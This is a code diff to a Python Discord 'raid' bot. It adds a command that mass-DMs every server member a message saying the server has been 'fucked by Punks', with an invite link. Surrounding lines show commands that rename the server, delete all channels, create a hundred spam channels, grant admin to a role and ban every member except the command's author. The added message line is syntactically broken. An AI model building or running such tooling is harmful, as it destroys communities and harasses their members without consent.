@@ -58,12 +58,13 @@ async def ayuda(ctx):
     embed.add_field(name="!glorificar", value="type !glorificar + role-name to give admin privileges to some role.", inline=False)
     embed.add_field(name="!millencolin", value="This command combines !eskorbuto, !kaotiko and !herejia at the same time, use this crap if you value your time. (Yeah sure, value your time raiding discord servers)", inline=True)
     embed.add_field(name="!elektroduentes", value="Works for ban all users, has some bugs due the Discord rate limit", inline=False)
+    embed.add_field(name="!dazepunk", value="This will send a single DM Message to all the users in the server, except the command author.", inline=True)
     await user.send(embed=embed)
 
 #Eskorbuto Command, if you want to use a custom image, just put the document in the same folder.
 @client.command()
 async def eskorbuto(ctx):
-    with open('anarchism.jpg', 'rb') as f: #Once you got the image that you want to use, just change the name of the file and change the extension if needed.
+    with open('anarchism.jpg', 'rb') as f: #Once you got the image that you want to use, just change the name of the file and the extension if needed, must be on the same folder of the bot file, but you can put a full path to image file.
         icon = f.read()
     await ctx.guild.edit(name="Server Punkwned by Anarchists", icon=icon) #Here's the new server name, change the name if you want.
     try:
@@ -71,7 +72,7 @@ async def eskorbuto(ctx):
             await channels.delete()
     except:
         print(f"Error, i can't delete the channel {channels}")
-    await asyncio.sleep(2)
+    await asyncio.sleep(2)  #2 Seconds of delay before the next action, just to avoid limitations with the requests or errors.
     x = 0 
     while x < 100:
         await ctx.guild.create_text_channel("server-punkwned")
@@ -113,7 +114,7 @@ async def flema(ctx):
 @client.command()
 async def elektroduendes(ctx):
     for users in ctx.guild.members:
-        if users != ctx.message.author:
+        if users != ctx.message.author: #Bot won't ban you using this command, because the != is going to check if the users are different from the message.author (The person that puts the command).
             try:
                 await users.ban()
             except:
@@ -127,7 +128,16 @@ async def glorificar(ctx, role: discord.Role, *, reason=None):
         print(f"Error, i can't edit the role {role}, Maybe i'm above of this role or it's somehow protected.")
 
 @client.command()
-async def millencolin(ctx):
+async def dazepunk(ctx):
+    for users in ctx.guild.members:
+        if users != ctx.message.author: #The bot will not send you any DM with this command using this conditional.
+            try:
+                await users.send(f"The server {} has been fucked by Punks:\nhttps://discord.gg/FhJydrmbTz")
+            except:
+                print(f"Error, i can't send a message to the user {user}, maybe he locked the DM Access.")
+
+@client.command()
+async def millencolin(ctx): #There's some bugs in this command, sometimes, the bot will not end a task and automatically will start another option for some reason.
     eskorbuto(ctx)
     kaotiko(ctx)
     herejia(ctx)
